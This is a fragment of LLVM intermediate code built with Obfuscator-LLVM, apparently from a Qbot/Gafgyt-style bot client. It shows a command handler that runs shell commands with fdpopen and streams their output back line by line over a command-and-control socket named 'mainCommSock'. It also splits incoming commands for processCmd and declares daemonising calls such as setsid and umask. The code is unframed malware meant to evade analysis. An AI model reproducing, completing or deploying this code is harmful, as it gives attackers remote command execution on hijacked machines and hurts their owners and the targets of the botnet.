; <label>:416:                                    ; preds = %412
  %417 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %417, i8 0, i64 1024, i32 16, i1 false)
  %418 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %419 = load i8*, i8** %26, align 8
  %420 = call i32 (i8*, i8*, ...) @szprintf(i8* %418, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i32 0, i32 0), i8* %419)
  %421 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %422 = call i32 @fdpopen(i8* %421, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store i32 %422, i32* %31, align 4
  br label %423

; <label>:423:                                    ; preds = %428, %416
  %424 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %425 = load i32, i32* %31, align 4
  %426 = call i8* @fdgets(i8* %424, i32 1024, i32 %425)
  %427 = icmp ne i8* %426, null
  br i1 %427, label %428, label %435

; <label>:428:                                    ; preds = %423
  %429 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @trim(i8* %429)
  %430 = load i32, i32* @mainCommSock, align 4
  %431 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %432 = call i32 (i32, i8*, ...) @sockprintf(i32 %430, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i32 0, i32 0), i8* %431)
  %433 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %433, i8 0, i64 1024, i32 16, i1 false)
  %434 = call i32 @sleep(i32 1)
  br label %423

; <label>:435:                                    ; preds = %423
  %436 = load i32, i32* %31, align 4
  %437 = call i32 @fdpclose(i32 %436)
  call void @exit(i32 0) #14
  unreachable

; <label>:438:                                    ; preds = %408
  store i32 1, i32* %33, align 4
  %439 = load i8*, i8** %26, align 8
  %440 = call i8* @strtok(i8* %439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %440, i8** %34, align 8
  %441 = load i8*, i8** %28, align 8
  %442 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  store i8* %441, i8** %442, align 16
  br label %443

; <label>:443:                                    ; preds = %474, %438
  %444 = load i8*, i8** %34, align 8
  %445 = icmp ne i8* %444, null
  br i1 %445, label %446, label %476

; <label>:446:                                    ; preds = %443
  %447 = load i8*, i8** %34, align 8
  %448 = load i8, i8* %447, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp ne i32 %449, 10
  br i1 %450, label %451, label %474

; <label>:451:                                    ; preds = %446
  %452 = load i8*, i8** %34, align 8
  %453 = call i64 @strlen(i8* %452) #10
  %454 = add i64 %453, 1
  %455 = call noalias i8* @malloc(i64 %454) #2
  %456 = load i32, i32* %33, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %457
  store i8* %455, i8** %458, align 8
  %459 = load i32, i32* %33, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %460
  %462 = load i8*, i8** %461, align 8
  %463 = load i8*, i8** %34, align 8
  %464 = call i64 @strlen(i8* %463) #10
  %465 = add i64 %464, 1
  call void @llvm.memset.p0i8.i64(i8* %462, i8 0, i64 %465, i32 1, i1 false)
  %466 = load i32, i32* %33, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %467
  %469 = load i8*, i8** %468, align 8
  %470 = load i8*, i8** %34, align 8
  %471 = call i8* @strcpy(i8* %469, i8* %470) #2
  %472 = load i32, i32* %33, align 4
  %473 = add nsw i32 %472, 1
  store i32 %473, i32* %33, align 4
  br label %474

; <label>:474:                                    ; preds = %451, %446
  %475 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %475, i8** %34, align 8
  br label %443

; <label>:476:                                    ; preds = %443
  %477 = load i32, i32* %33, align 4
  %478 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i32 0, i32 0
  call void @processCmd(i32 %477, i8** %478)
  %479 = load i32, i32* %33, align 4
  %480 = icmp sgt i32 %479, 1
  br i1 %480, label %481, label %495

; <label>:481:                                    ; preds = %476
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  br label %482

; <label>:482:                                    ; preds = %491, %481
  %483 = load i32, i32* %35, align 4
  %484 = load i32, i32* %33, align 4
  %485 = icmp slt i32 %483, %484
  br i1 %485, label %486, label %494

; <label>:486:                                    ; preds = %482
  %487 = load i32, i32* %35, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %488
  %490 = load i8*, i8** %489, align 8
  call void @free(i8* %490) #2
  br label %491

; <label>:491:                                    ; preds = %486
  %492 = load i32, i32* %35, align 4
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %35, align 4
  br label %482

; <label>:494:                                    ; preds = %482
  br label %495

; <label>:495:                                    ; preds = %494, %476
  br label %496

; <label>:496:                                    ; preds = %495, %308
  br label %205

; <label>:497:                                    ; preds = %307, %205
  br label %194
                                                  ; No predecessors!
  %499 = load i32, i32* %3, align 4
  ret i32 %499
}

declare i32 @umask(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146541122}
!2 = !{i32 -2146540429}
!3 = !{i32 -2146539624}
!4 = !{i32 -2146538867}
!5 = !{i32 -2146538147}
!6 = !{i32 -2146537205}
!7 = !{i32 -2146535726}
!8 = !{i32 -2146535009}
!9 = !{i32 -2146534171}
